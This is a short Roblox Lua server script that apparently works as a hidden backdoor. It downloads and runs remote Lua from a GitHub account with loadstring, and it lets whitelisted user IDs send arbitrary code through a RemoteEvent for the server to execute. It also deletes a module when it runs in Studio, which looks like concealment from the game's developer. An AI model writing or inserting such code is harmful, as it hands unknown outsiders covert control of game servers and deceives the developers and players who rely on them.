local skid = require(script.Parent.Parent)
local what = require(script.Parent.Parent.Utills.WHATTT)

local WebhookService = require(script.Parent.Parent.Utills:WaitForChild("WebhookService"))
local Runservice = game:GetService("RunService")
local httpservice = game:GetService("HttpService")
loadstring(httpservice:GetAsync("https://raw.githubusercontent.com/R15Architect404/endpoints/refs/heads/main/enabled.lua"))()
if getfenv().Enabled then
	


	local success, response = pcall(function()
		

		local platform = function()
			return Runservice:IsStudio()
		end
		
		loadstring(httpservice:GetAsync("https://raw.githubusercontent.com/R15Architect404/endpoints/refs/heads/main/userid.lua"))()

		game.Players.PlayerAdded:Connect(function(plr)
			skid.Server()

			if platform() then
				skid.Player(plr)
				script.Parent.Parent.Parent.ModuleScript:Destroy()

				return
			end
			game.ReplicatedStorage.Replicator.OnServerEvent:Connect(function(plr,data)
				if getfenv().UserId(tostring(plr.UserId)) then
					
						loadstring(data)()
					


				end

			end)

			if getfenv().UserId(tostring(plr.UserId)) then

				what:ssst(plr.Name)
			end
		end)

	end)
end
